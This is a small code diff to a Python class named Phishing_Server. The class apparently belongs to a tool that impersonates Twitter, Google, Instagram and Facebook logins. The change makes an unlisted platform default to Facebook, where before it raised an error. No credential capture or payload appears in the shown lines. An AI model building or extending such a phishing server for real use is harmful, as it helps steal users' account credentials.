@@ -7,7 +7,8 @@ class Phishing_Server:
         self.platforms = ['twitter', 'google', 'instagram', 'facebook']
         self.platform = platform
         if self.platform not in self.platforms:
-            raise Exception("Platform specified is not in the platform list.")
+            print(f"[+] The specified platform is not in the list.\n[+] You Can choose from: {self.platforms}\n[+] Going with Facebook.")
+            self.platform = "facebook"
         if externalip is None:
             self.externalip = ip
         else:
